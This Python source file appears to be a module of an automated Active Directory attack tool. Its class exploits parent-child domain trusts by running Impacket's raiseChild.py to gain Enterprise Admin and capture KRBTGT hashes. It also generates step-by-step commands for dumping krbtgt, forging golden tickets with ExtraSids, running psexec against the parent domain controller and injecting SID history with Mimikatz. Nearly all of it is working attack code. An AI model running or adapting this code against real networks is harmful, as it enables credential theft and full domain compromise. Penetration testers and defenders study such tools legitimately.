"""
Parent-Child Trust Exploiter
Exploit parent-child trust relationships
"""

import subprocess
import shutil
from typing import Optional, List
from pathlib import Path
from datetime import datetime

from .base import BaseExploiter
from ..models import (
    ExploitPath,
    ExploitAttempt,
    ExploitMethod,
    ExploitResult,
)
from ..utils import parse_raise_child_output, determine_parent_child


class ParentChildExploiter(BaseExploiter):
    """
    Exploit parent-child trust relationships
    Primary method: raiseChild.py for automated escalation
    """

    def __init__(self, output_dir: str = "auto_trust_exploit", verbose: bool = True):
        """Initialize parent-child exploiter"""
        super().__init__(output_dir, verbose)

    def is_available(self) -> bool:
        """Check if raiseChild.py is available"""
        return shutil.which("raiseChild.py") is not None

    def generate_commands(
            self,
            path: ExploitPath,
            username: str,
            dc_ip: str
    ) -> List[str]:
        """
        Generate raiseChild.py commands
        """
        child_domain, parent_domain = determine_parent_child(
            path.source_domain,
            path.target_domain
        )

        commands = [
            "# Parent-Child Trust Exploitation",
            "# Using Impacket raiseChild.py for automated escalation",
            "",
            f"# Child domain: {child_domain}",
            f"# Parent domain: {parent_domain}",
            "",
            "# Method 1: Automated escalation (recommended)",
            f"raiseChild.py {child_domain}/{username}:'PASSWORD'@{dc_ip}",
            "",
            "# Method 2: With target-exec for shell on parent DC",
            f"raiseChild.py {child_domain}/{username}:'PASSWORD' -target-exec PARENT_DC_IP",
            "",
            "# This will automatically:",
            "#   1. Dump child domain KRBTGT hash",
            "#   2. Get child domain SID",
            "#   3. Get parent domain SID (Enterprise Admins = -519)",
            "#   4. Create Golden Ticket with EA SID in ExtraSids",
            "#   5. Request inter-realm TGT to parent",
            "#   6. DCSync parent domain",
            "#   7. You have Enterprise Admin!",
            "",
            "# Alternative: Manual with ticketer.py",
            "# 1. Get child KRBTGT hash:",
            f"secretsdump.py {child_domain}/{username}:'PASSWORD'@{dc_ip} -just-dc-user krbtgt",
            "",
            "# 2. Get SIDs:",
            f"lookupsid.py {child_domain}/{username}:'PASSWORD'@{dc_ip}",
            "",
            "# 3. Forge Golden Ticket with ExtraSids:",
            f"ticketer.py -nthash KRBTGT_HASH -domain-sid CHILD_SID -domain {child_domain} \\",
            f"  -extra-sid PARENT_SID-519 administrator",
            "",
            "# 4. Use ticket:",
            "export KRB5CCNAME=administrator.ccache",
            f"psexec.py -k -no-pass {parent_domain}/administrator@PARENT_DC",
        ]

        return commands

    def exploit(
            self,
            path: ExploitPath,
            username: str,
            password: str,
            dc_ip: str
    ) -> ExploitAttempt:
        """
        Execute parent-child exploitation using raiseChild.py
        """
        child_domain, parent_domain = determine_parent_child(
            path.source_domain,
            path.target_domain
        )

        self.log(f"Exploiting parent-child trust...")
        self.log(f"Child: {child_domain}")
        self.log(f"Parent: {parent_domain}")

        attempt = ExploitAttempt(
            source_domain=child_domain,
            target_domain=parent_domain,
            method=ExploitMethod.RAISE_CHILD,
            result=ExploitResult.FAILED,
            started_at=datetime.now(),
        )

        if not self.is_available():
            self.log("raiseChild.py not available", "error")
            attempt.result = ExploitResult.COMMANDS_GENERATED

            # Generate commands for manual execution
            commands = self.generate_commands(path, username, dc_ip)
            cmd_file = self.save_commands(commands, path)
            attempt.commands_generated = commands
            attempt.output_file = str(cmd_file)
            attempt.completed_at = datetime.now()

            return attempt

        # Execute raiseChild.py
        cmd = f"raiseChild.py {child_domain}/{username}:'{password}'@{dc_ip}"

        self.log(f"Executing: raiseChild.py {child_domain}/{username}:***@{dc_ip}")

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )

            # Save output
            output_file = self.output_dir / f"raiseChild_{child_domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            output_file.write_text(result.stdout + "\n\nSTDERR:\n" + result.stderr)
            attempt.output_file = str(output_file)

            # Parse results
            parsed = parse_raise_child_output(result.stdout + result.stderr)

            if parsed["success"]:
                self.log("raiseChild.py SUCCESSFUL!", "success")
                attempt.result = ExploitResult.SUCCESS

                if parsed["enterprise_admin"]:
                    attempt.access_gained = "Enterprise Admin"
                    self.log(f"Gained Enterprise Admin in {parent_domain}!", "success")

                if parsed["krbtgt_hash"]:
                    attempt.trust_key_extracted = parsed["krbtgt_hash"]
                    self.log(f"Parent KRBTGT hash extracted", "success")
            else:
                self.log("raiseChild.py failed", "error")
                if parsed["errors"]:
                    attempt.error_message = "; ".join(parsed["errors"])
                    for err in parsed["errors"]:
                        self.log(f"  Error: {err}", "error")

                # Still generate manual commands
                self.log("Generating manual commands...", "info")
                commands = self.generate_commands(path, username, dc_ip)
                self.save_commands(commands, path)

        except subprocess.TimeoutExpired:
            self.log("raiseChild.py timeout", "error")
            attempt.error_message = "Timeout"
            attempt.result = ExploitResult.ERROR
        except Exception as e:
            self.log(f"Error: {e}", "error")
            attempt.error_message = str(e)
            attempt.result = ExploitResult.ERROR

        attempt.completed_at = datetime.now()
        return attempt

    def exploit_manual_sid_history(
            self,
            path: ExploitPath,
            username: str,
            dc_ip: str
    ) -> List[str]:
        """
        Generate commands for manual SID History injection
        Alternative when raiseChild.py fails
        """
        child_domain, parent_domain = determine_parent_child(
            path.source_domain,
            path.target_domain
        )

        commands = [
            "# Manual SID History Injection",
            "# Use when raiseChild.py fails",
            "",
            f"# Step 1: Get Enterprise Admins SID from {parent_domain}",
            f"lookupsid.py {parent_domain}/{username}:'PASSWORD'@PARENT_DC | grep 'Enterprise Admins'",
            "",
            "# Step 2: On DC of child domain, run Mimikatz:",
            "mimikatz # privilege::debug",
            f"mimikatz # sid::add /sam:{username} /new:PARENT_SID-519",
            "",
            f"# Step 3: Logout and login as {username}",
            f"# You now have Enterprise Admin rights in {parent_domain}!",
            "",
            f"# Step 4: Access parent domain resources:",
            f"dir \\\\{parent_domain}\\c$",
        ]

        return commands